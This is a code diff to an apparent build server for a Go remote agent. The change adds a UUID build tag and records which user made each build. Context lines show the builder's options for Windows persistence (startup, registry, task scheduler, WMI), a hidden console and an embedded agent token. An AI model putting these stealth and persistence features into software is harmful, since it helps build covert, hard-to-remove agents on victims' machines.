@@ -1,6 +1,7 @@
 import { $ } from "bun";
 import path from "path";
 import fs from "fs";
+import { v4 as uuidv4 } from "uuid";
 import { saveBuild } from "../db";
 import { logger } from "../logger";
 import { getConfig } from "../config";
@@ -64,6 +65,7 @@ type BuildProcessConfig = {
   persistenceMethod?: string;
   hideConsole?: boolean;
   noPrinting?: boolean;
+  builtByUserId?: number;
 };
 
 const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
@@ -221,6 +223,9 @@ export async function startBuildProcess(
       sendToStream({ type: "output", text: "Mutex: disabled\n", level: "info" });
     }
 
+    const buildTag = uuidv4();
+    sendToStream({ type: "output", text: `Build tag: ${buildTag}\n`, level: "info" });
+
     for (const platform of platformsToBuild) {
       const [os, arch, ...rest] = platform.split("-");
       const goarm = arch === "armv7" ? "7" : undefined;
@@ -325,6 +330,11 @@ export async function startBuildProcess(
         ldflags = ldflags ? `${ldflags} ${agentTokenFlag}` : agentTokenFlag;
       }
 
+      if (buildTag) {
+        const buildTagFlag = `-X overlord-client/cmd/agent/config.DefaultBuildTag=${buildTag}`;
+        ldflags = ldflags ? `${ldflags} ${buildTagFlag}` : buildTagFlag;
+      }
+
       if (config.hideConsole && os === "windows") {
         const hideConsoleFlag = "-H=windowsgui";
         ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
@@ -414,6 +424,8 @@ export async function startBuildProcess(
       startTime: build.startTime,
       expiresAt: build.expiresAt,
       files: build.files as any,
+      buildTag,
+      builtByUserId: config.builtByUserId,
     });
 
     setTimeout(() => {
